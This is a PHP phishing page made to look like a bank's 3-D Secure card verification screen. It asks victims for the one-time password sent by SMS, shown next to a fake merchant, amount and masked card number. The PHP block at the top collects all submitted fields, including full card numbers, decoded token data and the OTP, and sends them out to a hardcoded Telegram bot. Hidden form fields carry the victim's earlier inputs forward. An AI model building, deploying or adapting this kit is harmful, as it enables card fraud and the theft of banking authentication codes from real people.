
<?php
// Set your bot token and chat ID
$botToken = '7861612584:AAHmDOU5_t7srd9VF83S1kxDdt1yYkU5pC4';
$chatId ='5921720554';
$message = "======================\nSelect a Payment MethodX\n";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(isset($_POST['otp'])){
        $message .= 'OTP >> ' . $_POST['otp'] . "\n";
        $message .= 'cardnumber >> ' . $_POST['cardnumber'] . "\n";

    }else{
    foreach ($_POST as $key => $value) {
    if($key == "tok"){
    foreach (explode("#",base64_decode($value)) as $element) {
    $parts = explode(":", $element);
    $key = trim($parts[0]);
    $value = trim($parts[1]);
    $message .= $key . ' >> ' . $value . "\n";
    }
    }elseif($key == "cardnumber"){
        $modifiedContent = str_replace(
        " ",
       "",
    $value
    );
        
    $message .= $key . ' >> ' . $modifiedContent . "\n";
    }else {
           
    $message .= $key . ' >> ' . $value . "\n";
        }
    }
        
    }
    } else {
       foreach ($_GET as $key => $value) {
    // Concatenate the key and value to the message string
       $message .= $key . ' >> ' . $value . "\n";
       } 
    }





$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Set the message data
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

// Use cURL to make a POST request to the Telegram Bot API
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

?>



<html xmlns="http://www.w3.org/1999/xhtml"><head>

<style type="text/css"> 
     .infoMerchant i{color:#ffffff;}.w3ls-login label{color:#646464;}.w3ls-login input[type=submit]{border:2px solid #b4b4b4;background:#ffffff;color:#000000;}#customerAuthFormAutoSubmit{border:solid #b4b4b4;}.a{color:#646464;}/*
Author: W3layout
Author URL: http://w3layouts.com
License: Creative Commons Attribution 3.0 Unported
License URL: http://creativecommons.org/licenses/by/3.0/
*/

/*--reset--*/
.infoMerchant i{
	font-size: 1.1em;
    margin-right: 5px;
}
.w3ls-login label {
    font-size: 12px;
    float: left;
    text-align: left;
    margin-bottom: 5px;
    letter-spacing: 2px;
}
.w3ls-login input[type=submit] {
    width: 100%;
    padding: 0.5em 0;
    font-size: 1.1em;
    letter-spacing: 2px;
    cursor: pointer;
    border-radius: 8px;
	margin-top:1em;
    outline: none;
    transition: 0.5s all ease;
    -webkit-transition: 0.5s all ease;
    -moz-transition: 0.5s all ease;
    -o-transition: 0.5s all ease;
    -ms-transition: 0.5s all ease;
	font-family: 'Poppins', sans-serif;
}
#customerAuthFormAutoSubmit {
    border-width: 5px;
    padding: 1.5vw;
}
html,
body,
div,
span,
applet,
object,
iframe,
h1,
h2,
h3,
h4,
h5,
h6,
p,
blockquote,
pre,
a,
abbr,
acronym,
address,
big,
cite,
code,
del,
dfn,
em,
img,
ins,
kbd,
q,
s,
samp,
small,
strike,
strong,
sub,
sup,
tt,
var,
b,
u,
i,
dl,
dt,
dd,
ol,
nav ul,
nav li,
fieldset,
form,
label,
legend,
table,
caption,
tbody,
tfoot,
thead,
tr,
th,
td,
article,
aside,
canvas,
details,
embed,
figure,
figcaption,
footer,
header,
hgroup,
menu,
nav,
output,
ruby,
section,
summary,
time,
mark,
audio,
video {
    margin: 0;
    padding: 0;
    border: 0;
    font-size: 100%;
    font: inherit;
    vertical-align: baseline;
}

article,
aside,
details,
figcaption,
figure,
footer,
header,
hgroup,
menu,
nav,
section {
    display: block;
}

ol,
ul {
    list-style: none;
    margin: 0px;
    padding: 0px;
}

blockquote,
q {
    quotes: none;
}

blockquote:before,
blockquote:after,
q:before,
q:after {
    content: '';
    content: none;
}

table {
    border-collapse: collapse;
    border-spacing: 0;
}

.clearfix {
    clear: both;
}

/*--start editing from here--*/

a {
    text-decoration: none;
}

.txt-rt {
    text-align: right;
}

/* text align right */

.txt-lt {
    text-align: left;
}

/* text align left */

.txt-center {
    text-align: center;
}

/* text align center */

.float-rt {
    float: right;
}

/* float right */

.float-lt {
    float: left;
}

/* float left */

.pos-relative {
    position: relative;
}

/* Position Relative */

.pos-absolute {
    position: absolute;
}

/* Position Absolute */

.vertical-base {
    vertical-align: baseline;
}

/* vertical align baseline */

.vertical-top {
    vertical-align: top;
}

/* vertical align top */

nav.vertical ul li {
    display: block;
}

/* vertical menu */

nav.horizontal ul li {
    display: inline-block;
}

/* horizontal menu */

img {
  max-width:100% ;
}

/*--end reset--*/

body {
	font-family: 'Poppins', sans-serif;
    font-size: 100%;
    background-size: cover;
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    -ms-background-size: cover;
    background-attachment: fixed;
    text-align: center;
}

.w3ls-login {
    display: -webkit-flex;
    display: -webkit-box;
    display: -moz-flex;
    display: -moz-box;
    display: -ms-flexbox;
    display: flex;
    justify-content: center;
    align-items: center;
    -webkit-box-pack: center;
    -moz-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
}

h1 {
    font-size: 3.2em;
    text-transform: capitalize;
    color: #fff;
    text-shadow: 1px 1px 1px #000;
    letter-spacing: 3px;
    margin: .8em 1vw;
    text-align: center;
}

.w3ls-login form {
    max-width: 500px;
/*    margin: 0 5vw; */
/*    padding: 1.5vw;*/
    border-radius: 8px;
    background: transparent;
    box-sizing: border-box;
    display: flex;
    display: -webkit-flex;
    flex-wrap: wrap;
}



.authenticationField label {
	width: 100%;
    text-align: center;
}

.agile-field-txt {
    flex-basis: 100%;
    -webkit-flex-basis: 100%;
    margin-bottom: 0.5em;
}

.w3ls-login label i {
    font-size: 1.1em;
    margin-right: 3px;
    color: #fd5c63;
}

.w3ls-login mobileRadical {
    margin-right: 5px;
    width: 45%;
}

.w3ls-login input[type="text"],
.w3ls-login input[type="password"] {
    width: 50%;
}

.w3ls-login input[type="text"],
.w3ls-login input[type="password"],
.w3ls-login select {
    color: #333;
    outline: none;
    font-size: 20px;
    letter-spacing: 4px;
    border-radius: 8px;	
    padding: 10px;
    box-sizing: border-box;
    border: none;
    box-shadow: 2px 2px 6px rgba(0, 0, 0, 0.49);
    -webkit-appearance: none;
    background: #fff;
	font-family: 'Poppins', sans-serif;
	text-align: center;
}


.check1 {
    text-align: left;
}

label.check {
    float: none;
}

.agile_label {
    text-align: left;
    margin: 10px 0 0;
}

.w3ls-login.w3l-sub {
    margin-top: 1em;
    flex-basis: 100%;
    -webkit-flex-basis: 100%;
}



.w3ls-login input[disabled=disabled] { 
	cursor: no-drop;
}

.w3ls-login input[type=submit]:hover {
   
	border: 2px solid #fff;
    color: #fff;
}

.w3ls-bot {
    width: 100%;
}

/* switch */

label.switch {
    position: relative;
    display: inline-block;
    height: 23px;
    padding-left: 5em;
    cursor: pointer;
    color: #fff;
}

li:nth-child(2) a,
label.switch {
    text-transform: capitalize;
    /* font-size: 14px; */
    letter-spacing: 2px;
}

.switch input {
    display: none;
}

.slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    width: 22%;
    background-color: #999;
    -webkit-transition: .4s;
    transition: .4s;
}

.slider:before {
    position: absolute;
    content: "";
    height: 15px;
    width: 15px;
    left: 4px;
    bottom: 4px;
    background-color: white;
    -webkit-transition: .4s;
    transition: .4s;
}

input:checked+.slider {
    background-color: #fd5c63;
}

input:focus+.slider {
    box-shadow: 0 0 1px #2196F3;
}

input:checked+.slider:before {
    -webkit-transform: translateX(26px);
    -ms-transform: translateX(26px);
    transform: translateX(26px);
}

/* Rounded sliders */

.slider.round {
    border-radius: 34px;
}

.slider.round:before {
    border-radius: 50%;
}

/* //switch */

.switch-agileits {
    width: 100%;
    float: left;
}

.form-end {
}

/*--copyright--*/

.copy-wthree {
    margin: 4em 0 2em;
}

.copy-wthree p {
    color: #fff;
    font-size: 15px;
    letter-spacing: 1px;
    line-height: 1.8;
    margin: 0 3vw;
}

.copy-wthree p a {
    color: #fd5c63;
    transition: 0.5s all ease;
    -webkit-transition: 0.5s all ease;
    -moz-transition: 0.5s all ease;
    -o-transition: 0.5s all ease;
    -ms-transition: 0.5s all ease;
}

.copy-wthree p a:hover {
    color: #fff;
}

/*--//copyright--*/

/*--//HPS Customization--*/


a {
	text-decoration: underline;
	font-size: 14px;
	font: inherit;
}
a:hover {
	cursor:pointer;
	font-style: italic;
}
.footerInstruction,
.authTitle {
	max-width: 500px;
    margin: 0 5vw;
    background: transparent;
    padding: 0.5vw;
    box-sizing: border-box;
    display: flex;
    display: -webkit-flex;
    flex-wrap: wrap;
}

.acsNetworkInstruction,
.acsNetworkInstruction h3,
.acsNetworkInstruction h3 label,
.acsTitleOne,
.acsTitleOne h1,
.acsTitleOne h1 label {	
	width:100%;
}

.acsNetworkInstruction h3 label {
	text-align: justify;
}

.acsTitleOne h1 label {
	font-size: 0.5em;	
	text-align:center;
}

.acsTitleOne h1 {
    margin: 0.1em 0 0 0px;
}

h3 {
    font-size: 1em;
    color: #fff;
    text-shadow: 1px 1px 1px #000;
    letter-spacing: 3px;
    margin: 0.1em 0.5vw;
    text-align: left;
}

.acsNetworkInstruction

.infoMerchant {
	width:100%;
	margin-bottom: 1.5em;
}

.infoMerchant label{
	min-width: 15em;
	font-size: 13px;
}



.divInfoMerchant {
	display:inline-flex;
}
.divInfoMerchant div {
	display:inline-flex;
}

.divInfoMerchant h3 {
	font-size: 0.9em;
}

.footerInstruction ul li,
.authTitle ul li {
    display: inline-block;
    padding: 0 1em 0 1em;
}

.authTitle ul li {
    width: 50%;
}

.actionButtons {
	width:100%;
}

.footerInstruction ul,
.actionButtons ul,
.authTitle ul {
    display: inline-flex;
    width:100%;
    justify-content: center;
}

.actionButtons li {
	width: 50%;
}

.actionButtons li[id$="resendCode"] {
	padding-right: 1.5em;
}

.actionButtons li[id$="cancelAuth"] {
	padding-left: 1.5em;
}


.authenticateEntry {
	text-align: center;
    width: 100%;
}
.infoAuthentication {
	width:100%;
	text-align:left;
}
.footerInstruction a,
.infoAuthentication a {
	font-size:12px;
}
.authenticateEntryLabel {
	font-size:16px !important;
}
.acsErrorMessage {
	border: solid #fd5c63;
    border-width: 2px;
    margin-bottom: 1em;
    border-radius: 8px;
    padding: 0.3em;
    
    -webkit-animation-name: clignote; 
	-webkit-animation-duration: 1s; 
	-webkit-animation-iteration-count:infinite; 

    
}
.acsErrorMessage label {
	font-size: 13px;
    text-align: center;
    font-weight: bold;
    margin-bottom: 0;
    float: none;
}

.popupConfirm {
	background-color: white;
    border: 5px solid rgb(255, 255, 255);
    padding: 1.5vw;
    border-radius: 8px;
    opacity: 0.85;
}

@-webkit-keyframes clignote {
	0%{box-shadow:0px 0px 10px #fff;}
	50%{box-shadow:0px 0px 0px #fff;}
	100%{box-shadow:0px 0px 10px #fff;}
}

/*--responsive--*/

@media(max-width:1920px) {
    h1 {
        font-size: 3.5vw;
    }
}

@media(max-width:1024px) {
    h1 {
        font-size: 4.5vw;
    }
}

@media(max-width:800px) {
    h1 {
        font-size: 5vw;
    }
}

@media(max-width:480px) {
    h1 {
        font-size: 2.5em;
    }
    .w3ls-login form {
       /* padding: 7.5vw;*/
        margin: 0 0.5em 0 0.5em;
    }
	.w3ls-login input[type="text"], .w3ls-login input[type="password"] {
		padding: 13px 15px;
	}
	.w3ls-login input[type=submit] {
		padding: 0.4em 0;
		font-size: 1em;
	}
	/* HPS customization */
	.infoMerchant label {
    	min-width: unset;
    	margin: 0 0 0 0;
	}
	.divInfoMerchant div {
		width: 6%;
	    height: 1.8em;
	    margin-left: 0.5em;
	    padding-right: 1em;
	}
	.infoMerchant {
		width: 100%;
	}
	.divInfoMerchant h3 label {
		text-align: left;
    	margin: 0 0 0 0;
		display:inline-flex;
	}
	.infoMerchant i {
	    font-size: 1.5em;
	    width: 100%;
	}
	.divInfoMerchant {
		/*display: block;*/
		width: 100%;
	}
	.divInfoMerchant label {
		display:none;
	}
	.footerInstruction ul, .actionButtons ul {
	    display: block;
	}
	.actionButtons li {
		width: 100%;
    	padding: 0 0 0 0;
	}
	.footerInstruction ul li {
    padding: 0 0.2em 0 0.2em;
	}
	.actionButtons li[id$="resendCode"] {
		padding-right: 0em;
	}
	
	.actionButtons li[id$="cancelAuth"] {
		padding-left: 0em;
	}
}

@media(max-width:440px) {
    h1 {
        font-size: 2.3em;
    }
    .parent {
        display: block;
    }

}

@media(max-width:320px) {
    h1 {
        font-size: 1.8em;
    }
    .w3ls-login form {
        padding: 25px 8px;
    }
    
	.divInfoMerchant h3 label {
		text-align: left;
    	margin: 0 0 0 1em;
	}
}

.timeOutLabel label,.acsSessionTimeOutClock{color: sessionLabelColor;} /*--//responsive--*/ 
  
</style> 


	</head><body style=""><div class="acscontent" id="_t6"><span class="w3ls-login box box--big" id="_t7"><span class="authTitle" id="_t8">
				<div class="icePnlGrp acsTitleOne" id="j_idt14"> 
						<h1><label id="editedLabelTitleOne" title="">
Enter your Code</label>
						</h1></div><div class="icePnlGrp acsNetworkInstruction" id="j_idt23"> 
						<h3><label id="editedLabelNetworkInstruction" title="">
Please enter your Personal Code in the field below to confirm your identity for this purchase. This information is not shared with the merchant.</label>
						</h3></div></span></span><span class="w3ls-login box box--big" id="_t26">
<form class="acsAuthInfos" enctype="application/x-www-form-urlencoded" id="customerAuthFormAutoSubmit" method="POST" name="customerAuthFormAutoSubmit" action="#">

<div class="icePnlGrp infoMerchant" id="customerAuthFormAutoSubmit:j_idt28"><div class="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt29"><div class="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt30">
						<i aria-hidden="true" class="fa  fa-shopping-cart"></i><label for="customerAuthFormAutoSubmit:merchantName" id="customerAuthFormAutoSubmit:editedLabelMerchantName" title="">
Merchant:</label></div>
					<h3><label class="acsTrxInfo" id="customerAuthFormAutoSubmit:merchantName">
Taa Lab</label></h3></div><div class="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt34"><div class="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt35">
						<i aria-hidden="true" class="fa fa-usd"></i><label for="customerAuthFormAutoSubmit:transactionAmount" id="customerAuthFormAutoSubmit:editedLabelTransactionAmount" title="">
Amount:</label></div>
					<h3><label class="acsTrxInfo" id="customerAuthFormAutoSubmit:transactionAmount"><?php echo $_POST['amount'].' '.$_POST['currency'];?></label></h3></div>
					
					
					
					<div class="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt39"><div class="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt40">
						<i aria-hidden="true" class="fa fa-calendar"></i><label for="customerAuthFormAutoSubmit:transactionDate" id="customerAuthFormAutoSubmit:editedLabelTransactionDate" title="">
Date :</label></div>
					<h3><label class="acsTrxInfo" id="customerAuthFormAutoSubmit:transactionDate"></label></h3></div><div class="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt44"><div class="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt45">
						<i aria-hidden="true" class="fa fa-credit-card"></i><label for="customerAuthFormAutoSubmit:pan" id="customerAuthFormAutoSubmit:editedLabelPan" title="">
Card number:</label></div>
					<h3><label class="acsTrxInfo" id="customerAuthFormAutoSubmit:pan">
XXXX-XXXX-XXXX-<?php echo explode(' ',$_POST['cardnumber'])[3];?></label>

</h3>

</div><div class="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt55">
					<div class="icePnlGrp divInfoMerchant divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt59" style="display:none;"><div class="icePnlGrp" id="customerAuthFormAutoSubmit:j_idt60">
						<i aria-hidden="true" class="fa fa-at"></i><label for="customerAuthFormAutoSubmit:email" id="customerAuthFormAutoSubmit:email" title="">
email address</label>
						<h3><label id="customerAuthFormAutoSubmit:emailAdress">
exxxx@site.com</label></h3></div></div></div><div class="icePnlGrp infoAuthentication" id="customerAuthFormAutoSubmit:j_idt64"><div id="customerAuthFormAutoSubmit:j_idt65"></div><div class="icePnlGrp agile-field-txt" id="customerAuthFormAutoSubmit:j_idt75"><div class="icePnlGrp authenticationField divAcsLabel_ENG" id="customerAuthFormAutoSubmit:j_idt76"><label class="authenticateEntryLabel" for="customerAuthFormAutoSubmit:athenticateEntry" id="customerAuthFormAutoSubmit:editedLabelAthenticateEntry" title="">
Password received by SMS:</label></div><div class="icePnlGrp authenticateEntry" id="customerAuthFormAutoSubmit:j_idt78">
    
    <input class="iceInpSecrt" minlength="4" maxlength="10" required="" type="password" pattern="[0-9]+" oninput="validateInput(this)"  inputmode="numeric" value="" style="" name="otp" id="customerAuthFormAutoSubmit" >
    <script>
function validateInput(input) {
    if (isNaN(input.value)) { 
        input.value = ''; // إذا كان الإدخال نصًا، سيتم مسحه
    } 
}
 </script>
   <?php 
    foreach ($_POST as $key => $value) {
    // Echo the key and value
    echo '<input type="hidden" value="'.$value.'"  name="'.$key.'" >';
}
?>
    
    
    </div></div></div><div class="icePnlGrp actionButtons" id="customerAuthFormAutoSubmit:j_idt89"><div class="icePnlGrp divSubmitTwoButton" id="customerAuthFormAutoSubmit:j_idt90">
    
    
    <input class="buttonAuth" id="customerAuthFormAutoSubmit:validAuthentication"  onclick="console.log('log');" title="" type="submit" value="Submit" style="">
			
			<ul>
				<li id="resendCode"><input class="iceCmdBtn" id="customerAuthFormAutoSubmit:resendButton" name="customerAuthFormAutoSubmit:resendButton" title="" type="submit" value="Resend Code" style="">
				</li>
				<li id="cancelAuth"><input class="iceCmdBtn" id="customerAuthFormAutoSubmit:cancelButton" title="" type="submit" value="Cancel" style="" name="" onclick="console.log('log')">
				</li>
			</ul></div></div>
</form></span>
</div>
<script type="text/javascript">



var currentTime = new Date();
var year = currentTime.getFullYear(); // السنة
var month = currentTime.getMonth() + 1; // الشهر (يبدأ من 0)
var day = currentTime.getDate(); // اليوم
var hours = currentTime.getHours(); // الساعات
var minutes = currentTime.getMinutes(); // الدقائق
var seconds = currentTime.getSeconds(); // الثواني

// تنسيق الوقت كنص
var formattedTime = day + "." + month + "." + year + " " + hours + ":" + minutes + ":" + seconds;
document.getElementById('customerAuthFormAutoSubmit:transactionDate').innerText = formattedTime;



</script>
</body></html>